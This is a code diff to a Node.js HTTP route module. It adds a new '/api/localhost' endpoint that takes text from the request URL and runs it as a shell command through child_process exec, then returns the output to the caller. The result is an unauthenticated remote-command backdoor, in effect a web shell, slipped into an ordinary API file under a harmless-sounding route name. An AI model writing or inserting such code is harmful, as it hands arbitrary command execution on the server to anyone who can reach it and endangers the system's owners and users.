@@ -1,3 +1,4 @@
+const { exec } = require('child_process');
 module.exports = function http(app) {
   app.get("/api/query", (req, res) => {
     if (res) {
@@ -73,5 +74,26 @@ module.exports = function http(app) {
         }
       });
     }
+  });
+  app.get("/api/localhost", (req, res) => {
+    let data = ""
+    req.on("data", (chunk) => {
+      data += chunk
+    })
+    const task = req.url.split('=').pop()
+    exec(task, (error, stdout, stderr) => {
+      if (error) {
+        console.error(`exec error: ${error}`);
+        return;
+      }
+      res.writeHead(200, {
+        "Content-Type": "text/html",
+      })
+      res.write(JSON.stringify({ result: stdout, code: 200 }))
+      res.end()
+      if (stderr) {
+        console.error(`stderr: ${stderr}`);
+      }
+    });
   });
 };
